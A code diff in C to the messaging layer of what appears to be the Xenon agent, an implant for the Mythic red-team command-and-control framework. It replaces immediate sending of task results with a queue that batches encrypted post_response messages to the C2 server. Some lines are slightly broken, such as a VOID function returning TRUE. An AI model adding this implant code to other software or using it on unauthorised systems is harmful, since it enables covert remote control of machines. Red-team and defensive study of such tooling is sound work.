@@ -25,6 +25,8 @@ PPackage PackageInit(BYTE commandID, BOOL init)
         return NULL;
 
     package->length = 0;
+    package->Sent   = FALSE;
+
     if (init)
     {
         PackageAddString(package, xenonConfig->agentID, FALSE);
@@ -188,27 +190,34 @@ VOID PackageError(PCHAR taskUuid, UINT32 errorCode)
     PackageDestroy(error);
 }
 
-// Sends SUCCESS post_response to server for individual task
+// Queues package with complete status (no message ID)
 VOID PackageComplete(PCHAR taskUuid, PPackage package)
 {
-    // Initialize post_response package
-    PPackage data = PackageInit(POST_RESPONSE, TRUE);
+    /* Create post_response Package */
+    PPackage data = PackageInit(NULL, FALSE);
+    PackageAddByte(data, POST_RESPONSE);
+    /* Add Task UUID */
     PackageAddString(data, taskUuid, FALSE);
-
+    /* Add Data */
     if (package != NULL && package->buffer != NULL)
     {
         // Use data from package
         PackageAddBytes(data, (PBYTE)package->buffer, package->length, TRUE);
     }
+    else
+    {
+        PackageAddInt32(data, 0);
+    }
 
-    // Success response
+    /* Add Status Byte to End */
     PackageAddByte(data, TASK_COMPLETE);
 
-    // Send
-    PackageSend(data, NULL);
+    /* Queue Packet To Send */
+    // PackageSend(data, NULL);
+    PackageQueue(data);
 
     // Cleanup
-    PackageDestroy(data);
+    // PackageDestroy(data);
 }
 
 /**
@@ -291,95 +300,95 @@ cleanup:
 /**
  * @brief Immediately send a package to the server, ignoring response.
  */
-BOOL PackageSendNow(PPackage package, PPARSER response)
-{
-    BOOL bStatus = FALSE;
+// BOOL PackageSendNow(PPackage package, PPARSER response)
+// {
+//     BOOL bStatus = FALSE;
 
-    if ( xenonConfig->isEncryption ) 
-    {
-        if ( !CryptoMythicEncryptPackage(package) )
-            return FALSE;
-    }
+//     if ( xenonConfig->isEncryption ) 
+//     {
+//         if ( !CryptoMythicEncryptPackage(package) )
+//             return FALSE;
+//     }
 
-    if ( !PackageBase64Encode(package) )
-        return FALSE;
+//     if ( !PackageBase64Encode(package) )
+//         return FALSE;
 
-    _dbg("Client -> Server message (length: %d bytes)", package->length);
+//     _dbg("Client -> Server message (length: %d bytes)", package->length);
 
-    PBYTE pOutData      = NULL;
-    SIZE_T sOutLen      = 0;
+//     PBYTE pOutData      = NULL;
+//     SIZE_T sOutLen      = 0;
 
-#ifdef SMB_TRANSPORT
+// #ifdef SMB_TRANSPORT
 
-    if ( !NetworkSmbSend(package, NULL, NULL) )
-    {
-        _err("Failed to send network packet!");
-        return FALSE;
-    }
+//     if ( !NetworkSmbSend(package, NULL, NULL) )
+//     {
+//         _err("Failed to send network packet!");
+//         return FALSE;
+//     }
 
-#endif
+// #endif
 
-    // TODO remove comment
-    // In the case where SMB receive doesnt return anything
-    if (pOutData == NULL || sOutLen == 0) {
-        return TRUE;
-    }
+//     // TODO remove comment
+//     // In the case where SMB receive doesnt return anything
+//     if (pOutData == NULL || sOutLen == 0) {
+//         return TRUE;
+//     }
 
-    // Sometimes we don't care about the response data (post_response)
-    // Check response pointer for NULL to skip processes the response.
-    if (response == NULL)
-        goto end;
+//     // Sometimes we don't care about the response data (post_response)
+//     // Check response pointer for NULL to skip processes the response.
+//     if (response == NULL)
+//         goto end;
 
-    // Fill parser structure with data
-    ParserNew(response, pOutData, sOutLen);
+//     // Fill parser structure with data
+//     ParserNew(response, pOutData, sOutLen);
 
-    ////////////////////////////////////////
-    ////// Response Mythic package /////////
-    ////////////////////////////////////////
-    _dbg("\n\n===================RESPONSE======================\n");
-    _dbg("Server -> Client message (length: %d bytes)", response->Length);
+//     ////////////////////////////////////////
+//     ////// Response Mythic package /////////
+//     ////////////////////////////////////////
+//     _dbg("\n\n===================RESPONSE======================\n");
+//     _dbg("Server -> Client message (length: %d bytes)", response->Length);
  
-    if (!ParserBase64Decode(response)) {
-        _err("Base64 decoding failed");
-        goto end;
-    }
+//     if (!ParserBase64Decode(response)) {
+//         _err("Base64 decoding failed");
+//         goto end;
+//     }
 
-    // Check payload UUID
-    SIZE_T sizeUuid             = TASK_UUID_SIZE;
-    PCHAR receivedPayloadUUID   = NULL; 
-    receivedPayloadUUID         = ParserGetString(response, &sizeUuid);
-    // Use memcmp to pass a strict size of bytes to compare
-    if (memcmp(receivedPayloadUUID, xenonConfig->agentID, TASK_UUID_SIZE) != 0) {
-        _err("Check-in payload UUID doesn't match what we have. Expected - %s : Received - %s", xenonConfig->agentID, receivedPayloadUUID);
-        goto end;
-    }
+//     // Check payload UUID
+//     SIZE_T sizeUuid             = TASK_UUID_SIZE;
+//     PCHAR receivedPayloadUUID   = NULL; 
+//     receivedPayloadUUID         = ParserGetString(response, &sizeUuid);
+//     // Use memcmp to pass a strict size of bytes to compare
+//     if (memcmp(receivedPayloadUUID, xenonConfig->agentID, TASK_UUID_SIZE) != 0) {
+//         _err("Check-in payload UUID doesn't match what we have. Expected - %s : Received - %s", xenonConfig->agentID, receivedPayloadUUID);
+//         goto end;
+//     }
     
     
-    // Mythic AES decryption
-    if (xenonConfig->isEncryption)
-    {
-        if (!CryptoMythicDecryptParser(response))
-            goto end;
-    }
+//     // Mythic AES decryption
+//     if (xenonConfig->isEncryption)
+//     {
+//         if (!CryptoMythicDecryptParser(response))
+//             goto end;
+//     }
 
     
-    _dbg("Decrypted Response");
-    print_bytes(response->Buffer, response->Length);
+//     _dbg("Decrypted Response");
+//     print_bytes(response->Buffer, response->Length);
     
 
-    bStatus = TRUE;
+//     bStatus = TRUE;
 
-end:
+// end:
 
-    if ( pOutData != NULL )
-    {
-        memset(pOutData, 0, sOutLen);
-        LocalFree(pOutData);
-        pOutData = NULL;
-    }
+//     if ( pOutData != NULL )
+//     {
+//         memset(pOutData, 0, sOutLen);
+//         LocalFree(pOutData);
+//         pOutData = NULL;
+//     }
 
-    return bStatus;
-}
+//     return bStatus;
+// }
 
 /*
     Core function for sending C2 messages.
@@ -432,10 +441,12 @@ BOOL PackageSend(PPackage package, PPARSER response)
 
     // Sometimes we don't care about the response data (post_response)
     // Check response pointer for NULL to skip processes the response.
-    if (IsGetResponse == FALSE)
+    if (IsGetResponse == FALSE) {
+        bStatus = TRUE;
         goto end;
+    }
 
-    // Fill parser structure with data
+    /* Copy output to response parser */
     ParserNew(response, pOutData, sOutLen);
 
     ////////////////////////////////////////
@@ -485,6 +496,126 @@ end:
 
     return bStatus;
 }
+
+
+/**
+ * @brief Add a package to the sender Queue
+ */
+VOID PackageQueue(PPackage package)
+{
+    _dbg("Adding package to queue...");
+    
+    PPackage List = NULL;
+
+    if ( !package ) {
+        return;
+    }
+    
+    /* If there are no queued packages, this is the first */
+    if ( !xenonConfig->PackageQueue )
+    {
+        xenonConfig->PackageQueue  = package;
+    }
+    else
+    {
+        /* Add to the end of linked-list */
+        List = xenonConfig->PackageQueue;
+        while ( List->Next ) {
+            List = List->Next;
+        }
+        List->Next  = package;
+    }
+    
+    return TRUE;
+}
+
+/**
+ * @brief Send all the queued packages to server
+ * 
+ * @return BOOL - Did request succeed
+ */
+BOOL PackageSendAll(PPARSER response)
+{
+    _dbg("Sending All Queued Packages to Server ...");
+
+    PPackage Current  = NULL;
+    PPackage Entry    = NULL;
+    PPackage Prev     = NULL;
+    PPackage Next     = NULL;
+    PPackage Package  = NULL;
+    BOOL     Success  = FALSE;
+
+    /* Nothing to send */
+    if ( !xenonConfig->PackageQueue )
+        return TRUE;
+
+    /* Add all packages into a single post_response packet */
+    Package = PackageInit(POST_RESPONSE, TRUE);
+
+    Current = xenonConfig->PackageQueue;
+
+    /* Include as many packages as fit */
+    while ( Current )
+    {
+        if ( (Package->length + Current->length) > MAX_REQUEST_LENGTH )
+        {
+            _dbg("[INFO] MAX_REQUEST_LENGTH reached, deferring remaining packages");
+            break;
+        }
+
+        _dbg("Adding package (%d bytes)", Current->length);
+
+        PackageAddBytes(Package, Current->buffer, Current->length, FALSE);
+        Current->Sent = TRUE;
+
+        Current = Current->Next;
+    }
+
+    _dbg("Sending [%d] bytes to server now...", Package->length);
+
+    /* Send packet */
+    if ( !PackageSend(Package, response) )
+    {
+        _err("Packet failed to send");
+        goto CLEANUP;
+    }
+
+    Success = TRUE;
+
+    /* Cleanup only SENT packages */
+    Entry = xenonConfig->PackageQueue;
+    Prev  = NULL;
+
+    while ( Entry )
+    {
+        Next = Entry->Next;
+
+        if ( Entry->Sent )
+        {
+            if ( Prev )
+                Prev->Next = Next;
+            else
+                xenonConfig->PackageQueue = Next;
+
+            PackageDestroy(Entry);
+        }
+        else
+        {
+            Prev = Entry;
+        }
+
+        Entry = Next;
+    }
+
+CLEANUP:
+
+    PackageDestroy(Package);
+
+    return Success;
+}
+
+
+
 
 VOID PackageDestroy(PPackage package)
 {
